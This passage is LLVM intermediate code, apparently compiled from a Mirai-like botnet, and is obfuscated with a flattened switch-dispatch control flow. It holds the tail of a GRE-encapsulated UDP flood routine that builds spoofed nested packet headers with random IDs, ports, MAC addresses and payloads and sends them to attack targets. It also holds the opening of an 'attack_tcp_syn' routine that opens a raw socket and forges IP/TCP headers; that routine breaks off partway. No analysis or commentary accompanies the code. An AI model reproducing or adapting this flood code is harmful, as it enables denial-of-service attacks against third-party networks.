  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 2
  store i16 %255, i16* %257, align 2
  store i32 -1091871458, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %9, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  store i32 1363190281, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 1573578041, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1135147548, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %9, align 4
  %265 = load i8, i8* %5, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %264, %266
  %268 = select i1 %267, i32 -1899381703, i32 -1083616486
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8**, i8*** %11, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8*, i8** %270, i64 %272
  %274 = load i8*, i8** %273, align 8
  store i8* %274, i8** %30, align 8
  %275 = load i8*, i8** %30, align 8
  %276 = bitcast i8* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %31, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.grehdr*
  store %struct.grehdr* %279, %struct.grehdr** %32, align 8
  %280 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %281 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %280, i64 1
  %282 = bitcast %struct.grehdr* %281 to %struct.ethhdr*
  store %struct.ethhdr* %282, %struct.ethhdr** %33, align 8
  %283 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %284 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %283, i64 1
  %285 = bitcast %struct.ethhdr* %284 to %struct.iphdr*
  store %struct.iphdr* %285, %struct.iphdr** %34, align 8
  %286 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i64 1
  %288 = bitcast %struct.iphdr* %287 to %struct.udphdr*
  store %struct.udphdr* %288, %struct.udphdr** %35, align 8
  %289 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i64 1
  %291 = bitcast %struct.udphdr* %290 to i8*
  store i8* %291, i8** %36, align 8
  %292 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 2
  %297 = load i8, i8* %296, align 4
  %298 = zext i8 %297 to i32
  %299 = icmp slt i32 %298, 32
  %300 = select i1 %299, i32 1569508764, i32 -1802012629
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  store i32 -1802012629, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %21, align 4
  %324 = icmp eq i32 %323, -1
  %325 = select i1 %324, i32 1127213688, i32 1391672313
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = call i32 @rand_next()
  %328 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 8
  store i32 %327, i32* %329, align 4
  store i32 1391672313, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i16, i16* %13, align 2
  %332 = zext i16 %331 to i32
  %333 = icmp eq i32 %332, 65535
  %334 = select i1 %333, i32 -1662778994, i32 -1366397109
  store i32 %334, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 3
  %343 = load i16, i16* %342, align 4
  %344 = zext i16 %343 to i32
  %345 = sub nsw i32 %344, 1000
  %346 = xor i32 %345, -1
  %347 = trunc i32 %346 to i16
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 3
  store i16 %347, i16* %349, align 4
  store i32 -1366397109, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i16, i16* %16, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  %354 = select i1 %353, i32 499252819, i32 -886940769
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = call i32 @rand_next()
  %357 = and i32 %356, 65535
  %358 = trunc i32 %357 to i16
  %359 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 0
  store i16 %358, i16* %360, align 2
  store i32 -886940769, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i16, i16* %17, align 2
  %363 = zext i16 %362 to i32
  %364 = icmp eq i32 %363, 65535
  %365 = select i1 %364, i32 439238439, i32 1899461192
  store i32 %365, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  store i32 1899461192, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i8, i8* %20, align 1
  %374 = icmp ne i8 %373, 0
  %375 = select i1 %374, i32 -2060381370, i32 1317206116
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 9
  store i32 %377, i32* %379, align 4
  store i32 -816947911, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  %383 = load i32, i32* %382, align 4
  %384 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  store i32 -816947911, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  store i32 %387, i32* %37, align 4
  %388 = call i32 @rand_next()
  store i32 %388, i32* %38, align 4
  %389 = call i32 @rand_next()
  store i32 %389, i32* %39, align 4
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 0
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i32 0, i32 0
  %393 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %392, i8* %393, i32 4)
  %394 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %395 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %394, i32 0, i32 1
  %396 = getelementptr inbounds [6 x i8], [6 x i8]* %395, i32 0, i32 0
  %397 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 4)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 0
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %401, i8* %402, i32 2)
  %403 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %404 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %403, i32 0, i32 1
  %405 = getelementptr inbounds [6 x i8], [6 x i8]* %404, i32 0, i32 0
  %406 = getelementptr inbounds i8, i8* %405, i64 4
  %407 = bitcast i32* %39 to i8*
  %408 = getelementptr inbounds i8, i8* %407, i64 2
  call void @util_memcpy(i8* %406, i8* %408, i32 2)
  %409 = load i8, i8* %19, align 1
  %410 = icmp ne i8 %409, 0
  %411 = select i1 %410, i32 -78913802, i32 -1500436890
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8*, i8** %36, align 8
  %414 = load i32, i32* %18, align 4
  call void @rand_str(i8* %413, i32 %414)
  store i32 -1500436890, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = bitcast %struct.iphdr* %418 to i16*
  %420 = call zeroext i16 @checksum_generic(i16* %419, i32 20)
  %421 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 %420, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 0, i16* %424, align 2
  %425 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %426 = bitcast %struct.iphdr* %425 to i16*
  %427 = call zeroext i16 @checksum_generic(i16* %426, i32 20)
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 %427, i16* %429, align 2
  %430 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i32 0, i32 3
  store i16 0, i16* %431, align 2
  %432 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %433 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %434 = bitcast %struct.udphdr* %433 to i8*
  %435 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %436 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %435, i32 0, i32 2
  %437 = load i16, i16* %436, align 2
  %438 = load i32, i32* %18, align 4
  %439 = sext i32 %438 to i64
  %440 = add i64 8, %439
  %441 = trunc i64 %440 to i32
  %442 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %432, i8* %434, i16 zeroext %437, i32 %441)
  %443 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 3
  store i16 %442, i16* %444, align 2
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 0
  store i16 2, i16* %450, align 4
  %451 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  %453 = load i32, i32* %452, align 4
  %454 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %455 = load i32, i32* %9, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %454, i64 %456
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i32 0, i32 0
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %458, i32 0, i32 2
  %460 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %459, i32 0, i32 0
  store i32 %453, i32* %460, align 4
  %461 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %462 = load i32, i32* %9, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 0
  %466 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %465, i32 0, i32 1
  store i16 0, i16* %466, align 2
  %467 = load i32, i32* %10, align 4
  %468 = load i8*, i8** %30, align 8
  %469 = load i32, i32* %18, align 4
  %470 = sext i32 %469 to i64
  %471 = add i64 66, %470
  %472 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %473 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %474 = load i32, i32* %9, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 0
  %478 = bitcast %struct.sockaddr_in* %477 to %struct.sockaddr*
  store %struct.sockaddr* %478, %struct.sockaddr** %472, align 8
  %479 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %480 = load %struct.sockaddr*, %struct.sockaddr** %479, align 8
  %481 = call i64 @sendto(i32 %467, i8* %468, i64 %471, i32 16384, %struct.sockaddr* %480, i32 16)
  store i32 1193945251, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32, i32* %9, align 4
  %484 = add nsw i32 %483, 1
  store i32 %484, i32* %9, align 4
  store i32 1135147548, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  store i32 1573578041, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %485, %482, %415, %412, %386, %380, %376, %372, %366, %361, %355, %350, %335, %330, %326, %322, %301, %269, %263, %262, %261, %258, %242, %234, %228, %219, %215, %162, %158, %104, %98, %97, %94, %88, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -641994494, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -641994494, label %first
    i32 127804765, label %99
    i32 -659712233, label %100
    i32 -1686347680, label %106
    i32 -525563688, label %109
    i32 -2142511021, label %110
    i32 -521592316, label %116
    i32 -1127848892, label %160
    i32 575104572, label %164
    i32 -2137837040, label %289
    i32 921692409, label %292
    i32 -53018792, label %293
    i32 1402116950, label %294
    i32 321246160, label %300
    i32 -1818550549, label %320
    i32 2131828434, label %341
    i32 1623078259, label %345
    i32 -569924771, label %349
    i32 2073058314, label %354
    i32 1382886862, label %360
    i32 1685667246, label %365
    i32 -1941978, label %371
    i32 -696235062, label %376
    i32 -1272882419, label %382
    i32 -1292532336, label %386
    i32 -1722498177, label %390
    i32 -467936176, label %394
    i32 1184037670, label %398
    i32 -425571582, label %402
    i32 680131946, label %408
    i32 1129700785, label %446
    i32 1775960433, label %449
    i32 -1746869931, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 127804765, i32 -659712233
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 -1746869931, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 -1686347680, i32 -525563688
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -1746869931, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -2142511021, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 -521592316, i32 921692409
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 -1127848892, i32 575104572
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 575104572, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
